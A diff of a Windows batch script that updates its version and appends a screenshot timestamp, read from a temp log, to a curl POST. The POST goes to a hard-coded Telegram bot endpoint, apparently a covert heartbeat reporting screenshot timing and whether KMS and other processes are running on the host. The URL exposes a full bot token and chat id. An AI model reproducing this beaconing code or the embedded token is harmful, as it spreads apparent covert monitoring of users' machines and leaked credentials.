@@ -10,7 +10,7 @@ if not exist "%temp%\i059.tmp" type nul > "%temp%\i059.tmp"
 setlocal enabledelayedexpansion
 
 
-set "BATCHVERSION=3.9"
+set "BATCHVERSION=4.0"
 
 
 
@@ -95,10 +95,14 @@ echo Minutess=%MINUTESS%
 echo.
 echo.
 
+:: Read the updated value
+set "LASTSCREENFILE=%TEMP%\lastscreenrun.log"
+set /p TIMESS=<"%LASTSCREENFILE%"
+
 :: Check if 20 minutes have passed
 if %MINUTESS% GEQ 20 goto NEXT14
 
-curl -s -X POST "https://api.telegram.org/bot7470339630:AAEwHeixYKwvT6WYutXCjBBugdjTGjTIZVA/sendMessage" -F "chat_id=-1002163721260" -F "message_thread_id=74293" -F "text=KadyyGmr|SHST%SHSTRUNNING%KMS%KMSRUNNING%|SCRNSHT%MINUTESS%|%time%|%BATCHVERSION%|"
+curl -s -X POST "https://api.telegram.org/bot7470339630:AAEwHeixYKwvT6WYutXCjBBugdjTGjTIZVA/sendMessage" -F "chat_id=-1002163721260" -F "message_thread_id=74293" -F "text=KadyyGmr|SHST%SHSTRUNNING%KMS%KMSRUNNING%|SCRNSHT%MINUTESS%(%TIMESS%)|%time%|%BATCHVERSION%|"
 
 goto GOGO3
 
